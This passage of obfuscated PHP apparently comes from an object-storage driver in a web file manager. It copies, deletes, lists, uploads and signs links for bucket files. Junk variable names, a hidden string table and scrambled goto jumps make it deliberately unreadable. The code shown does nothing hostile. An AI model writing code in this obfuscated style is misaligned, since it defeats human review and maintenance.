$_SERVER[¹Ò‹Ò¹][33], !0); if ($BÏ¾¢ÁÁ¶º !== !1) { return $this->getPathOuter($e‹ÁßêŠ»²); } return !1; } public function copyFile($dî¿ĞÂìñ, $F´¹æÇä®ò, $c¦ùğ†…Ÿ = array()) { $Eß±ØñÀä =& $_SERVER[¹Ò‹Ò¹]; $f¦£‡ö»† = $this->objectMeta($dî¿ĞÂìñ); if (!$f¦£‡ö»†) { return !1; } if ($f¦£‡ö»†[$Eß±ØñÀä[77]] <= 1024 * 1024 * 200) { $B±ğ—š»Ò = $this->client->copyObject($this->bucket, $dî¿ĞÂìñ, $this->bucket, $F´¹æÇä®ò, $Eß±ØñÀä[190], $c¦ùğ†…Ÿ); } else { $B±ğ—š»Ò = $this->client->multiCopyObject($this->bucket, $dî¿ĞÂìñ, $this->bucket, $F´¹æÇä®ò, $c¦ùğ†…Ÿ); } $B±ğ—š»Ò = $B±ğ—š»Ò ? $this->getPathOuter($F´¹æÇä®ò) : !1; return $B±ğ—š»Ò; } public function moveFile($B‘çÒË¡», $d°ÛÈß´àË) { if ($this->copyFile($B‘çÒË¡», $d°ÛÈß´àË)) { $this->delFile($B‘çÒË¡»); return $this->getPathOuter($d°ÛÈß´àË); } return !1; } public function delFile($B‘ ì¨¿ä¡) { return $this->client->deleteObject($this->bucket, $B‘ ì¨¿ä¡); } public function delFolder($BÇŒ£ò³×œ) { goto E‹Äß»ÇÛÓ; E‹Äß»ÇÛÓ: $Cö‰®¨£† =& $_SERVER[¹Ò‹Ò¹]; if (!$this->exist($BÇŒ£ò³×œ)) { return !0; } $this->listItemCache = !1; goto B•¦ŒìÑÍ; F­â ±ÚÓ: if (!empty($BÇŒ£ò³×œ) && !in_array($aÀõù¾Áóù, $Dƒ»°ğõ¥ˆ[$Cö‰®¨£†[74]])) { $Dƒ»°ğõ¥ˆ[$Cö‰®¨£†[74]][] = $aÀõù¾Áóù; } $c¢ßó¼™İ” = $this->delByBatch($Dƒ»°ğõ¥ˆ[$Cö‰®¨£†[73]]); if (!$c¢ßó¼™İ”) { return !1; } goto Bäæšª¦ª‘; B•¦ŒìÑÍ: $Dƒ»°ğõ¥ˆ = $this->fileList($BÇŒ£ò³×œ); $this->listItemCache = !0; $aÀõù¾Áóù = trim($BÇŒ£ò³×œ, $Cö‰®¨£†[8]) . $Cö‰®¨£†[8]; goto F­â ±ÚÓ; Bäæšª¦ª‘: return $this->delByBatch($Dƒ»°ğõ¥ˆ[$Cö‰®¨£†[74]]); goto f«ø„äåŠ¤; f«ø„äåŠ¤: } private function delByBatch($cÚÊó°õ”Ù) { foreach (array_chunk($cÚÊó°õ”Ù, 1000) as $B£»âå ¬) { $f»“Âµ«‰â = $this->client->deleteObjects($this->bucket, $B£»âå ¬); if (!$f»“Âµ«‰â) { return !1; } } return !0; } public function rename($EÊÔ¶Ç•, $c”§ÒÆøƒ‘) { return $this->renameObject($EÊÔ¶Ç•, $c”§ÒÆøƒ‘); } public function listPath($A”Â±Â÷Ñ, $Eîğ•‰‚æã = false) { $EùëøŒŸäÑ =& $_SERVER[¹Ò‹Ò¹]; $D…Ô³æ®ˆš = $this->fileList($A”Â±Â÷Ñ, $EùëøŒŸäÑ[8], !0); foreach ($D…Ô³æ®ˆš[$EùëøŒŸäÑ[74]] as $FœÜ£ß˜¿… => $CÓ¸åƒÂÓÀ) { $D…Ô³æ®ˆš[$EùëøŒŸäÑ[74]][$FœÜ£ß˜¿…] = $this->folderInfo($CÓ¸åƒÂÓÀ, $Eîğ•‰‚æã); } foreach ($D…Ô³æ®ˆš[$EùëøŒŸäÑ[73]] as $FœÜ£ß˜¿… => $CÓ¸åƒÂÓÀ) { $D…Ô³æ®ˆš[$EùëøŒŸäÑ[73]][$FœÜ£ß˜¿…] = $this->fileInfo($CÓ¸åƒÂÓÀ[$EùëøŒŸäÑ[28]], $Eîğ•‰‚æã, $CÓ¸åƒÂÓÀ); } return $D…Ô³æ®ˆš; } private function fileInfo($C›Ä»Å¯¡, $Dà³ñ¶õÖ” = false, $F‚÷Ã¹ÜÙÖ = array()) { goto a›™÷¯ôÄ; a›™÷¯ôÄ: $e†Á‡Á÷¨ =& $_SERVER[¹Ò‹Ò¹]; $eÔŞ–ñçÁª = array($e†Á‡Á÷¨[28] => $this->pathThis($C›Ä»Å¯¡), $e†Á‡Á÷¨[75] => $this->getPathOuter($C›Ä»Å¯¡), $e†Á‡Á÷¨[29] => $e†Á‡Á÷¨[191], $e†Á‡Á÷¨[167] => $this->ext($C›Ä»Å¯¡), $e†Á‡Á÷¨[77] => isset($F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[77]]) ? $F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[77]] : 0); if ($Dà³ñ¶õÖ”) { return $eÔŞ–ñçÁª; } goto aóÙô¯Ğå; aóÙô¯Ğå: $eÔŞ–ñçÁª[$e†Á‡Á÷¨[192]] = $eÔŞ–ñçÁª[$e†Á‡Á÷¨[83]] = 0; $eÔŞ–ñçÁª[$e†Á‡Á÷¨[193]] = $eÔŞ–ñçÁª[$e†Á‡Á÷¨[194]] = !0; if (empty($F‚÷Ã¹ÜÙÖ)) { $F‚÷Ã¹ÜÙÖ = $this->objectMeta($C›Ä»Å¯¡); if (!$F‚÷Ã¹ÜÙÖ) { return $eÔŞ–ñçÁª; } } goto fºÒ»Ğ¶ÛÒ; fºÒ»Ğ¶ÛÒ: if (isset($F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[195]])) { $eÔŞ–ñçÁª[$e†Á‡Á÷¨[83]] = $F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[195]]; } if (isset($F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[77]])) { $eÔŞ–ñçÁª[$e†Á‡Á÷¨[77]] = $F‚÷Ã¹ÜÙÖ[$e†Á‡Á÷¨[77]]; } return $eÔŞ–ñçÁª; goto eŞÓŠíƒÎ; eŞÓŠíƒÎ: } private function folderInfo($bæ¹Œ×óñ‚, $Fè‡á¨×ß = false) { goto E®˜ÈÊŞÃ‰; C«Ò¤ˆ×™ç: return $C»Ûâ¯¾Åó; goto b«½Íô¿º; eŸ¹ŠºÛä: $bæ¹Œ×óñ‚ = trim($bæ¹Œ×óñ‚, $dçé“¨£…ì[8]) . $dçé“¨£…ì[8]; $cĞ•Ì«õÖ = $this->objectMeta($bæ¹Œ×óñ‚); if (isset($cĞ•Ì«õÖ[$dçé“¨£…ì[195]])) { $C»Ûâ¯¾Åó[$dçé“¨£…ì[192]] = $cĞ•Ì«õÖ[$dçé“¨£…ì[195]]; } goto C«Ò¤ˆ×™ç; b‡®¡“¾àª: $C»Ûâ¯¾Åó[$dçé“¨£…ì[192]] = $C»Ûâ¯¾Åó[$dçé“¨£…ì[83]] = 0; $C»Ûâ¯¾Åó[$dçé“¨£…ì[193]] = $C»Ûâ¯¾Åó[$dçé“¨£…ì[194]] = !0; if ($bæ¹Œ×óñ‚ == $dçé“¨£…ì[33]) { return $C»Ûâ¯¾Åó; } goto eŸ¹ŠºÛä; E®˜ÈÊŞÃ‰: $dçé“¨£…ì =& $_SERVER[¹Ò‹Ò¹]; $C»Ûâ¯¾Åó = array($dçé“¨£…ì[28] => $this->pathThis($bæ¹Œ×óñ‚), $dçé“¨£…ì[75] => $this->getPathOuter($dçé“¨£…ì[8] . $bæ¹Œ×óñ‚), $dçé“¨£…ì[29] => $dçé“¨£…ì[76]); if ($Fè‡á¨×ß) { return $C»Ûâ¯¾Åó; } goto b‡®¡“¾àª; b«½Íô¿º: } private function fileList($a¨ˆí²Æ¦, $D ¦Ğ¾²©„ = '', $bãë “¼Ó§ = 0) { goto E†‘½ÙÅñÛ; E†‘½ÙÅñÛ: $DÁ®¡Íöö =& $_SERVER[¹Ò‹Ò¹]; $C²ğ¯«ê¾ƒ = rtrim($a¨ˆí²Æ¦, $DÁ®¡Íöö[8]) . $DÁ®¡Íöö[8]; $CÌ¿£ÙÜÛÏ = $this->listObjs($C²ğ¯«ê¾ƒ, null, null, $D ¦Ğ¾²©„); goto Bæ‡» ó„±; DÌ©óÕéˆ˜: foreach ($CÌ¿£ÙÜÛÏ[$DÁ®¡Íöö[196]] as $aéØèÎ¥ê) { goto f¯™â˜Ë; f¯™â˜Ë: $fí•¦‘§¦ = $aéØèÎ¥ê[$DÁ®¡Íöö[28]]; if ($fí•¦‘§¦ == $C²ğ¯«ê¾ƒ) { continue; } $eŠÑ·¡Ä½á = isset($aéØèÎ¥ê[$DÁ®¡Íöö[77]]) ? $aéØèÎ¥ê[$DÁ®¡Íöö[77]] : 0; goto D‡š¢Ä¸Ë; D‡š¢Ä¸Ë: $aå×•ºÒ¸ = $eŠÑ·¡Ä½á == 0 && substr($fí•¦‘§¦, strlen($fí•¦‘§¦) - 1, 1) == $DÁ®¡Íöö[8] ? !0 : !1; if ($fÌŸ‚åº²) { $this->cacheMethod($DÁ®¡Íöö[197], $fí•¦‘§¦, $aå×•ºÒ¸); $this->cacheMethod($DÁ®¡Íöö[198], $fí•¦‘§¦, $aéØèÎ¥ê); } if ($aå×•ºÒ¸) { $d‹ÏÆ‰¹Ó[] = $fí•¦‘§¦; continue; } goto Cë¡å«†Ùš; Cë¡å«†Ùš: $b›ö±©÷[] = $bãë “¼Ó§ ? $aéØèÎ¥ê : $fí•¦‘§¦; goto e¬ïøŠª‘ñ; e¬ïøŠª‘ñ: } foreach ($CÌ¿£ÙÜÛÏ[$DÁ®¡Íöö[199]] as $aéØèÎ¥ê) { $d‹ÏÆ‰¹Ó[] = $aéØèÎ¥ê[$DÁ®¡Íöö[28]]; if ($fÌŸ‚åº²) { $this->cacheMethod($DÁ®¡Íöö[197], $aéØèÎ¥ê[$DÁ®¡Íöö[28]], !0); } } if ($fÌŸ‚åº²) { $this->cacheMethod($DÁ®¡Íöö[197], $a¨ˆí²Æ¦, !0); } goto fàÂí«®¢; Bæ‡» ó„±: if (!$CÌ¿£ÙÜÛÏ) { return array($DÁ®¡Íöö[74] => array(), $DÁ®¡Íöö[73] => array()); } $fÌŸ‚åº² = $this->listItemCache === !1 ? !1 : !0; $d‹ÏÆ‰¹Ó = $b›ö±©÷ = array(); goto DÌ©óÕéˆ˜; fàÂí«®¢: return array($DÁ®¡Íöö[74] => $d‹ÏÆ‰¹Ó, $DÁ®¡Íöö[73] => $b›ö±©÷); goto dÙ‡¼èÎö; dÙ‡¼èÎö: } private function listObjs($EğôÜ‰¢»ê, $cš¬æŒŒßå = null, $b…õšâĞ = null, $f§šğ‹„Î = null) { $B‰¶ÆµÄ˜ =& $_SERVER[¹Ò‹Ò¹]; $EğôÜ‰¢»ê = trim($EğôÜ‰¢»ê, $B‰¶ÆµÄ˜[8]); $CŒ¢‚ª‡Êù = empty($EğôÜ‰¢»ê) ? $B‰¶ÆµÄ˜[33] : $EğôÜ‰¢»ê . $B‰¶ÆµÄ˜[8]; return $this->client->getBucket($this->bucket, $CŒ¢‚ª‡Êù, $cš¬æŒŒßå, $b…õšâĞ, $f§šğ‹„Î, !0); } public function has($Cå«¯ÃÕèµ, $bò†Á»ºùõ = false, $DãÔ°Å™Ç = true) { goto D»‚ –÷¬„; eóê‘õØŒ: $Bİ›ÍÌÏ = null; $bêóõšâ½ = 500; $bö’Ùˆ¬š… = $EÖÆæÃÌ¿[8]; goto Cğø¦Ã³Ú; Cğø¦Ã³Ú: $b÷°×‰éÃÊ = $E¡†–±ÃÕ» = array(); while (!0) { $C·£ó¿Ñš = $this->listObjs($Cå«¯ÃÕèµ, $Bİ›ÍÌÏ, $bêóõšâ½, $bö’Ùˆ¬š…); if (!$C·£ó¿Ñš) { break; } $Bİ›ÍÌÏ = $C·£ó¿Ñš[$EÖÆæÃÌ¿[200]]; $dŠ·—ÃÆ¨Õ = $C·£ó¿Ñš[$EÖÆæÃÌ¿[196]]; $d˜¸âó˜… = $C·£ó¿Ñš[$EÖÆæÃÌ¿[199]]; if (empty($dŠ·—ÃÆ¨Õ) && empty($d˜¸âó˜…)) { break; } if (count($dŠ·—ÃÆ¨Õ) == 1 && $dŠ·—ÃÆ¨Õ[0][$EÖÆæÃÌ¿[28]] == $EŒ¬Õ˜Ù¨Ø) { break; } if ($bò†Á»ºùõ) { if (count($dŠ·—ÃÆ¨Õ)) { $dŠ·—ÃÆ¨Õ = array_column($dŠ·—ÃÆ¨Õ, $EÖÆæÃÌ¿[28]); $b÷°×‰éÃÊ = array_merge($b÷°×‰éÃÊ, $dŠ·—ÃÆ¨Õ); } if (count($d˜¸âó˜…)) { $d˜¸âó˜… = array_column($d˜¸âó˜…, $EÖÆæÃÌ¿[28]); $E¡†–±ÃÕ» = array_merge($E¡†–±ÃÕ», $d˜¸âó˜…); } if ($Bİ›ÍÌÏ === null) { break; } continue; } if ($DãÔ°Å™Ç) { if (!empty($dŠ·—ÃÆ¨Õ)) { if (count($dŠ·—ÃÆ¨Õ) > 1 || isset($dŠ·—ÃÆ¨Õ[0][$EÖÆæÃÌ¿[28]]) && $dŠ·—ÃÆ¨Õ[0][$EÖÆæÃÌ¿[28]] != $EŒ¬Õ˜Ù¨Ø) { return !0; } } } else { if (!empty($d˜¸âó˜…)) { return !0; } } if ($Bİ›ÍÌÏ === null) { break; } } if ($bò†Á»ºùõ) { $b÷°×‰éÃÊ = array_diff($b÷°×‰éÃÊ, array($EŒ¬Õ˜Ù¨Ø)); $b÷°×‰éÃÊ = count(array_unique($b÷°×‰éÃÊ)); $E¡†–±ÃÕ» = count(array_unique($E¡†–±ÃÕ»)); return array($EÖÆæÃÌ¿[201] => $b÷°×‰éÃÊ, $EÖÆæÃÌ¿[202] => $E¡†–±ÃÕ»); } goto c©ëö÷©™Ó; D»‚ –÷¬„: $EÖÆæÃÌ¿ =& $_SERVER[¹Ò‹Ò¹]; $Cå«¯ÃÕèµ = trim($Cå«¯ÃÕèµ, $EÖÆæÃÌ¿[8]); $EŒ¬Õ˜Ù¨Ø = empty($Cå«¯ÃÕèµ) ? $EÖÆæÃÌ¿[33] : $Cå«¯ÃÕèµ . $EÖÆæÃÌ¿[8]; goto eóê‘õØŒ; c©ëö÷©™Ó: return !1; goto A¦™•Í½÷¢; A¦™•Í½÷¢: } public function listAll($E—¸ÏŠ”ÁÎ) { $eìõì¦å¤… =& $_SERVER[¹Ò‹Ò¹]; $F¦‹¦ƒ“ùÈ = $this->fileList($E—¸ÏŠ”ÁÎ, $eìõì¦å¤…[33], !0); $CâÊŞ ˆ = array(); foreach ($F¦‹¦ƒ“ùÈ[$eìõì¦å¤…[73]] as $B¬¥ôôøÅ) { $CâÊŞ ˆ[$B¬¥ôôøÅ[$eìõì¦å¤…[28]]] = $B¬¥ôôøÅ[$eìõì¦å¤…[77]]; } foreach ($F¦‹¦ƒ“ùÈ[$eìõì¦å¤…[74]] as $B¬¥ôôøÅ) { if (is_string($B¬¥ôôøÅ)) { $CâÊŞ ˆ[$B¬¥ôôøÅ] = 0; } } return $this->listAllFiles($E—¸ÏŠ”ÁÎ, array_keys($CâÊŞ ˆ), $CâÊŞ ˆ); } public function canRead($C¾Ú¹«±îÍ) { $Cï‘Ğ˜Ê·Æ =& $_SERVER[¹Ò‹Ò¹]; $cçÌã¼õ¬Œ = $this->client->getAccessControlPolicy($this->bucket, $C¾Ú¹«±îÍ); if (!$cçÌã¼õ¬Œ) { return !1; } return in_array($cçÌã¼õ¬Œ, array($Cï‘Ğ˜Ê·Æ[203], $Cï‘Ğ˜Ê·Æ[204], $Cï‘Ğ˜Ê·Æ[205])) ? !0 : !1; } public function canWrite($C¸Ò­Ä¾£¾) { $e½½ç¡Ä½¨ =& $_SERVER[¹Ò‹Ò¹]; $D÷ÂÓ¥½è = $this->client->getAccessControlPolicy($this->bucket, $C¸Ò­Ä¾£¾); if (!$D÷ÂÓ¥½è) { return !1; } return in_array($D÷ÂÓ¥½è, array($e½½ç¡Ä½¨[203], $e½½ç¡Ä½¨[204])) ? !0 : !1; } public function getContent($EëèÈæß) { return $this->client->getObject($this->bucket, $EëèÈæß); } public function setContent($F›¿Â§„à, $EÆê–õ™ä = '', $A†‚…½ñã = false) { goto cÑšÃäáµœ; cÑšÃäáµœ: $dÎ„ß™ =& $_SERVER[¹Ò‹Ò¹]; $F›¿Â§„à = $A†‚…½ñã ? trim($F›¿Â§„à, $dÎ„ß™[8]) . $dÎ„ß™[8] : $F›¿Â§„à; $AğÒË·‹Ú = get_file_mime(get_path_ext($F›¿Â§„à)); goto C÷ÎšÚÜ°Í; C÷ÎšÚÜ°Í: $b‡íñ³‰ë— = $this->client->putObject($EÆê–õ™ä, $this->bucket, $F›¿Â§„à, $dÎ„ß™[190], array(), $AğÒË·‹Ú); if (!$b‡íñ³‰ë—) { return !1; } if ($A†‚…½ñã) { return !0; } goto B§…Ã©Ëğğ; B§…Ã©Ëğğ: $this->cacheMethod(null, null); $b‡íñ³‰ë— = $this->copyFile($F›¿Â§„à, $F›¿Â§„à, array($dÎ„ß™[206] => $b‡íñ³‰ë—[$dÎ„ß™[207]])); return $b‡íñ³‰ë— ? !0 : !1; goto b±íƒ±ª²ø; b±íƒ±ª²ø: } public function fileSubstr($Câ·‹î¢¼, $eªÓ¾†äÒİ, $dºãÛ´ù«) { $a¥â°µ¦Š = $eªÓ¾†äÒİ + $dºãÛ´ù« - 1; return $this->client->getObject($this->bucket, $Câ·‹î¢¼, array($_SERVER[¹Ò‹Ò¹][208] => "\x62\x79\164\145\163\x3d{$eªÓ¾†äÒİ}\55{$a¥â°µ¦Š}")); } public function upload($aâÓ‚¬Ùà¹, $AÆÊŞÑì›, $Aæ›¬²ê‚à = false, $CİÙªù›ò = REPEAT_REPLACE) { $F­°²™Ÿ” =& $_SERVER[¹Ò‹Ò¹]; $a¶ëÈš¹÷ = array($F­°²™Ÿ”[206] => @md5_file($AÆÊŞÑì›)); $FØ‡¶­ë = array($F­°²™Ÿ”[209] => get_file_mime(get_path_ext($aâÓ‚¬Ùà¹))); if (IO::size($AÆÊŞÑì›) <= 1024 * 1024 * 200) { $dáó´¿¹ÀÅ = $this->client->putObjectFile($AÆÊŞÑì›, $this->bucket, $aâÓ‚¬Ùà¹, $F­°²™Ÿ”[190], $a¶ëÈš¹÷, $FØ‡¶­ë); return !empty($dáó´¿¹ÀÅ) ? $this->getPathOuter($aâÓ‚¬Ùà¹) : !1; } $cñÃÊë•§¬ = $this->client->multiUploadObject($AÆÊŞÑì›, $this->bucket, trim($aâÓ‚¬Ùà¹, $F­°²™Ÿ”[8]), $a¶ëÈš¹÷, $FØ‡¶­ë); return $cñÃÊë•§¬ ? $this->getPathOuter($aâÓ‚¬Ùà¹) : !1; } public function download($A†›â™í­¾, $eİé›ª®¿) { if (!@is_dir($this->pathFather($eİé›ª®¿)) && !IO::mkdir($this->pathFather($eİé›ª®¿))) { return !1; } $aÉÁíí­ÂÒ = $this->client->getObject($this->bucket, $A†›â™í­¾, array(), $eİé›ª®¿); return $aÉÁíí­ÂÒ !== !1 ? $eİé›ª®¿ : !1; } public function link($B¯ì”¶‡ë, $bÙÉ•§Âòö = array()) { $EìÅŠÏøÆÊ =& $_SERVER[¹Ò‹Ò¹]; if ($this->signVer == $EìÅŠÏøÆÊ[210]) { return $this->client->getAuthenticatedURL($this->bucket, $B¯ì”¶‡ë, 3600 * 12, $bÙÉ•§Âòö); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B¯ì”¶‡ë, $EìÅŠÏøÆÊ[8]), 3600 * 12, $this->region, array(), !0, $bÙÉ•§Âòö); } public function fileOut($A‡„óßŸÀ, $d®“–„‡†… = false, $bäÎ¿›ò„Ë = false, $DŸ½ºøÓàÁ = '') { goto añÁ‘‹×Ÿ; BƒŞÔÖ½âÉ: $eì®¹Š’­  = array($EÇÏ…à…¬‘[214] => $d®“–„‡†… . $EÇÏ…à…¬‘[215] . rawurlencode($bäÎ¿›ò„Ë), $EÇÏ…à…¬‘[216] => $f´Í‘½åÛ); $DµËÂİøµÊ = $this->link($A‡„óßŸÀ, $eì®¹Š’­ ); $this->fileOutLink($DµËÂİøµÊ); goto d‚àŒ’Š‘‚; añÁ‘‹×Ÿ: $EÇÏ…à…¬‘ =& $_SERVER[¹Ò‹Ò¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($A‡„óßŸÀ, $d®“–„‡†…, $bäÎ¿›ò„Ë, $DŸ½ºøÓàÁ); } if (!$bäÎ¿›ò„Ë) { $bäÎ¿›ò„Ë = $this->pathThis($A‡„óßŸÀ); } goto aÈ‚åÏ°´; aÈ‚åÏ°´: $f´Í‘½åÛ = get_file_mime(get_path_ext($bäÎ¿›ò„Ë)); if ($f´Í‘½åÛ == $EÇÏ…à…¬‘[211]) { return parent::fileOut($A‡„óßŸÀ, $d®“–„‡†…, $bäÎ¿›ò„Ë, $DŸ½ºøÓàÁ); } $d®“–„‡†… = $d®“–„‡†… ? $EÇÏ…à…¬‘[212] : $EÇÏ…à…¬‘[213]; goto BƒŞÔÖ½âÉ; d‚àŒ’Š‘‚: } public function fileOutServer($AöŠĞ§¾ÁÊ, $A½šÊ¬¥Ê† = false, $a‘ˆ®•ÉÀ = false, $A†Û‡îŒÎ° = '') { parent::fileOut($AöŠĞ§¾ÁÊ, $A½šÊ¬¥Ê†, $a‘ˆ®•ÉÀ, $A†Û‡îŒÎ°); } public function fileOutImageServer($bé‡ÄÀôã’, $B£ÍùÏŞ = 250) { parent::fileOutImage($bé‡ÄÀôã’, $B£ÍùÏŞ); } public function hashMd5($a‰Ò´×ÕÂ˜, $a¼ÛëÜ‘ó = '') { $B…„ÓŠ—…ë =& $_SERVER[¹Ò‹Ò¹]; $C½¯ôªÑÙ— = $this->objectMeta($a‰Ò´×ÕÂ˜); if (!$C½¯ôªÑÙ—) { return !1; } $a¼ÛëÜ‘ó = $a¼ÛëÜ‘ó ? $a¼ÛëÜ‘ó : _get($C½¯ôªÑÙ—, $B…„ÓŠ—…ë[217]); $a¼ÛëÜ‘ó = $a¼ÛëÜ‘ó ? $a¼ÛëÜ‘ó : _get($C½¯ôªÑÙ—, $B…„ÓŠ—…ë[207], $B…„ÓŠ—…ë[33]); return $a¼ÛëÜ‘ó; } public function uploadFormData($a¶‰óè‘‹, $d„ëêÅ’¥ = 3600) { $b‰åº™ãÅ› =& $_SERVER[¹Ò‹Ò¹]; $e¥¯ªÊ†ˆí = $this->pathFather($a¶‰óè‘‹); $BÇêÅ˜ëæ¶ = $this->client->getHttpUploadPostParams($this->bucket, $e¥¯ªÊ†ˆí, $b‰åº™ãÅ›[190], $d„ëêÅ’¥); return array_merge((array) $BÇêÅ˜ëæ¶, array($b‰åº™ãÅ›[174] => $this->getHost())); } public function multiUploadFormData($c£İÌÉàÅ, $Aåí•ËªŸ = 3600) { $dÖÅ‘Ô†ÏÇ =& $_SERVER[¹Ò‹Ò¹]; $BƒµïÆä‹ = gmdate($dÖÅ‘Ô†ÏÇ[218]); $FÀÔ­‘áğ˜ = array(); $a¹Éó†§•ñ = $this->client->getUploadId($this->bucket, $c£İÌÉàÅ, $FÀÔ­‘áğ˜); if (!$a¹Éó†§•ñ) { return !1; } return array($dÖÅ‘Ô†ÏÇ[219] => $a¹Éó†§•ñ, $dÖÅ‘Ô†ÏÇ[174] => $this->getHost() . $dÖÅ‘Ô†ÏÇ[8] . $this->pathEncode($c£İÌÉàÅ), $dÖÅ‘Ô†ÏÇ[220] => $BƒµïÆä‹, $dÖÅ‘Ô†ÏÇ[92] => $c£İÌÉàÅ); } public function multiUploadAuthData($c’ƒœäâÆà, $a½Çï¤ø•í = array()) { goto F»¼Ş‚¦˜÷; e²¹°¥Ç¨: $AÀÅ’œ†Öõ = implode($e–œƒ¾Öù[227], $aÙƒÒ§ˆä£); $D‰–×ˆ¦„ = base64_encode(hash_hmac($e–œƒ¾Öù[228], $AÀÅ’œ†Öõ, $this->secret, !0)); $f¤ƒ±„œò = $e–œƒ¾Öù[229] . $this->accessKey . $e–œƒ¾Öù[4] . $D‰–×ˆ¦„; goto eäåÆÖØ¶ ; eäåÆÖØ¶ : if (strpos($fƒîŒ¤ÌÊ¸, $e–œƒ¾Öù[223]) === 0) { return array($e–œƒ¾Öù[230] => $f¤ƒ±„œò, $e–œƒ¾Öù[220] => $c”ˆ‹¾ÏîÆ); } return $f¤ƒ±„œò; goto E—â·¯œŸÄ; fêÃäŒó‡Ê: $aÙƒÒ§ˆä£ = array($e–œƒ¾Öù[222], $e–œƒ¾Öù[33], $e–œƒ¾Öù[118], $e–œƒ¾Öù[33], "\170\x2d\141\x6d\172\x2d\x64\x61\164\145\x3a{$c”ˆ‹¾ÏîÆ}", $e–œƒ¾Öù[8] . $this->bucket . $e–œƒ¾Öù[8] . $this->pathEncode($Eçù—›µâò) . $fƒîŒ¤ÌÊ¸); if (strpos($fƒîŒ¤ÌÊ¸, $e–œƒ¾Öù[223]) === 0) { $aÙƒÒ§ˆä£[0] = $e–œƒ¾Öù[224]; } if (isset($a½Çï¤ø•í[$e–œƒ¾Öù[225]]) && $a½Çï¤ø•í[$e–œƒ¾Öù[225]] == $e–œƒ¾Öù[226]) { $aÙƒÒ§ˆä£[0] = $e–œƒ¾Öù[226]; } goto e²¹°¥Ç¨; F»¼Ş‚¦˜÷: $e–œƒ¾Öù =& $_SERVER[¹Ò‹Ò¹]; $c”ˆ‹¾ÏîÆ = isset($a½Çï¤ø•í[$e–œƒ¾Öù[220]]) ? $a½Çï¤ø•í[$e–œƒ¾Öù[220]] : gmdate($e–œƒ¾Öù[218]); $fƒîŒ¤ÌÊ¸ = isset($a½Çï¤ø•í[$e–œƒ¾Öù[167]]) ? $a½Çï¤ø•í[$e–œƒ¾Öù[167]] : $e–œƒ¾Öù[33]; goto bÚ‚‡íõáØ; bÚ‚‡íõáØ: $Eçù—›µâò = $a½Çï¤ø•í[$e–œƒ¾Öù[92]]; unset($a½Çï¤ø•í[$e–œƒ¾Öù[92]]); if (isset($a½Çï¤ø•í[$e–œƒ¾Öù[221]])) { $a½Çï¤ø•í[$e–œƒ¾Öù[220]] = $c”ˆ‹¾ÏîÆ; return $this->listUploadParts($Eçù—›µâò, $a½Çï¤ø•í); } goto fêÃäŒó‡Ê; E—â·¯œŸÄ: } public function listUploadParts($EÈÅÑ³î—­, $a—ÌìŠ¢«‰ = array()) { goto cÑØ¡ß¦èë; EâˆÒ±Ë‹Ò: $dÑ©³±Ğ²¿ = $this->multiUploadAuthData($EÈÅÑ³î—­, $a—ÌìŠ¢«‰); if (empty($dÑ©³±Ğ²¿)) { return !1; } return array($CÑ·´¾‹[230] => $dÑ©³±Ğ²¿, $CÑ·´¾‹[220] => $a—ÌìŠ¢«‰[$CÑ·´¾‹[220]], $CÑ·´¾‹[232] => $E¿Äî’ìÖ©); goto AÂˆÓÛæ—Ø; D‰…ğÉôÙß: if (!$E¿Äî’ìÖ©) { return !1; } unset($a—ÌìŠ¢«‰[$CÑ·´¾‹[221]], $a—ÌìŠ¢«‰[$CÑ·´¾‹[225]]); $a—ÌìŠ¢«‰[$CÑ·´¾‹[92]] = $EÈÅÑ³î—­; goto EâˆÒ±Ë‹Ò; cÑØ¡ß¦èë: $CÑ·´¾‹ =& $_SERVER[¹Ò‹Ò¹]; $aå¶õ•‰Ÿí = str_replace($CÑ·´¾‹[231], $CÑ·´¾‹[33], $a—ÌìŠ¢«‰[$CÑ·´¾‹[167]]); $E¿Äî’ìÖ© = $this->client->listParts($this->bucket, $EÈÅÑ³î—­, $aå¶õ•‰Ÿí); goto D‰…ğÉôÙß; AÂˆÓÛæ—Ø: } public function getHost() { return parent::getHost() . $_SERVER[¹Ò‹Ò¹][8] . $this->bucket; } public function size($fÌàëèøáô) { $fãš‚¼à = $this->objectMeta($fÌàëèøáô); return $fãš‚¼à ? $fãš‚¼à[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function info($E”Ô’Ù¼›–) { if ($this->isFolder($E”Ô’Ù¼›–)) { return $this->folderInfo($E”Ô’Ù¼›–); } else { if ($this->isFile($E”Ô’Ù¼›–)) { return $this->fileInfo($E”Ô’Ù¼›–); } } return !1; } public function exist($cõâÜ‡Ÿ–) { return $this->isFile($cõâÜ‡Ÿ–) || $this->isFolder($cõâÜ‡Ÿ–); } public function isFile($FÁïÆ‘µ—â) { return !$this->isFolder($FÁïÆ‘µ—â) && $this->objectMeta($FÁïÆ‘µ—â); } public function isFolder($d‘‹Ÿ–Ş‰®) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][197], $d‘‹Ÿ–Ş‰®); } protected function objectMeta($f¼ÇÀßàÀ£) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][198], $f¼ÇÀßàÀ£); } protected function _objectMeta($e†™Ö¦×‰†) { $b…Ë÷Óë• =& $_SERVER[¹Ò‹Ò¹]; $e†™Ö¦×‰† = rtrim($e†™Ö¦×‰†, $b…Ë÷Óë•[8]); try { $d–µÁ‚·¼¬ = $this->client->getObjectInfo($this->bucket, $e†™Ö¦×‰†); if (!isset($d–µÁ‚·¼¬[$b…Ë÷Óë•[217]]) && isset($d–µÁ‚·¼¬[$b…Ë÷Óë•[233]])) { $d–µÁ‚·¼¬[$b…Ë÷Óë•[217]] = $d–µÁ‚·¼¬[$b…Ë÷Óë•[233]]; } } catch (Exception $fø¬Ç«é¹) { $d–µÁ‚·¼¬ = !1; } if (!$d–µÁ‚·¼¬) { } return $d–µÁ‚·¼¬; } protected function _isFolder($CÛö…„¦õù) { goto e¸ÙÜğ­Â¨; e…ä¾íÖ­ê: if (substr($DºÔÈˆÛÓï, -1) == $cëš¾ç­®[8]) { return !0; } if (get_path_this($DºÔÈˆÛÓï) == get_path_this($CÛö…„¦õù)) { return !1; } return !0; goto E˜«µˆˆ–Ø; 